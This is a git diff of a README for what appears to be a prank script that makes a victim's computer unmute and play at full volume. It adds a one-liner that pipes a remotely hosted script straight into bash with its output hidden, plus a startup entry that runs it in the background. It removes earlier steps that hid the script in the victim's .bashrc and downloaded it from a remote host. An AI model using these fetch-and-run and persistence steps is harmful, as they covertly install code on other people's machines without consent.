@@ -11,32 +11,17 @@ Didn't work very well for them now did it?
 Did you say they tried muting it?
 Ahh - you mean it unmuted and went to full volume a second later.
 
-
-
-
-Run via
+##ONE LINER##
+---------------
 ```bash
-    ./al.sh & disown $!
+curl -L http://git.to/pal | bash -s > /dev/null 2>&1
 ```
 
-## Implementation ideas BASHRC##
-Hide in their bashrc
-```bash
-    ./{PATH_TO_FILE}/al.sh & disown $!
-```
-
-Do everything via: mkdir
-```bash
-    ~/.config/al >/dev/null 2>&1; cd ~/.config/al; \
-    wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh \
-    && echo ". ~/.config/al/al.sh & disown $!" >> ~/.bashrc
-```
 ## Implementation ideas StartUP Command##
 https://help.ubuntu.com/community/AddingProgramToSessionStartup
 ```bash
-    ./{PATH_TO_FILE}/al.sh & disown $!
+. ~/.config/al/al.sh & disown
 ```
-
 
 ## Removal Instructions ##
 ---------------------------
